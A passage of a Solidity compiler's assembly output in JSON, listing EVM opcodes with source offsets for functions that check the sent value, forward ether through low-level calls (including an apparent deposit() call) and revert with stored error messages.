											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "21"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "23"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8532,
											"end": 8609,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 19,
											"end": 20,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "EQ",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "26"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 67,
											"end": 71,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 61,
											"end": 72,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 134,
											"end": 138,
											"name": "PUSH",
											"source": -1,
											"value": "1F"
										},
										{
											"begin": 130,
											"end": 139,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 123,
											"end": 127,
											"name": "PUSH",
											"source": -1,
											"value": "3F"
										},
										{
											"begin": 105,
											"end": 121,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 101,
											"end": 128,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 97,
											"end": 140,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 94,
											"end": 95,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 141,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 88,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 77,
											"end": 142,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 157,
											"end": 173,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 154,
											"end": 155,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 147,
											"end": 174,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 211,
											"end": 227,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 208,
											"end": 209,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 201,
											"end": 205,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 194,
											"end": 206,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 179,
											"end": 228,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "25"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "tag",
											"source": -1,
											"value": "26"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 32,
											"end": 36,
											"name": "PUSH",
											"source": -1,
											"value": "60"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 36,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "tag",
											"source": -1,
											"value": "25"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8515,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8515,
											"end": 8609,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8515,
											"end": 8609,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8628,
											"end": 8635,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH",
											"source": 0,
											"value": "2A"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH data",
											"source": 0,
											"value": "653FDA1BE56379A9B0A26648001A0166E0A82C4C958ABB08BD69DF8FDCED27C3"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH",
											"source": 0,
											"value": "2A"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "tag",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 8620,
											"end": 8682,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8383,
											"end": 8690,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 8070,
											"end": 8375,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8137,
											"end": 8140,
											"name": "PUSH",
											"source": 0,
											"value": "64"
										},
										{
											"begin": 8125,
											"end": 8134,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 8125,
											"end": 8140,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8125,
											"end": 8140,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH",
											"source": 0,
											"value": "2E"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH data",
											"source": 0,
											"value": "F371FBDB092F2395CC186DBC470C83E478621C58586470025DE75A9DADAEC15C"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH",
											"source": 0,
											"value": "2E"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "tag",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 8117,
											"end": 8191,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8205,
											"end": 8217,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8221,
											"end": 8237,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8242,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8221,
											"end": 8242,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8249,
											"end": 8258,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "PUSH",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "PUSH",
											"source": 0,
											"value": "D0E30DB000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 38,
											"end": 42,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 29,
											"end": 36,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 67,
											"end": 77,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 96,
											"end": 154,
											"name": "PUSH",
											"source": -1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 199,
											"end": 207,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 192,
											"end": 196,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 186,
											"end": 190,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 167,
											"end": 177,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 160,
											"end": 209,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 0,
											"end": 215,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8260,
											"end": 8296,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "30"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "32"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3",
											"source": -1
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "30"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"source": -1,
											"value": "32"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"source": -1,
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP",
											"source": -1
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR",
											"source": -1
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6",
											"source": -1
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8221,
											"end": 8297,
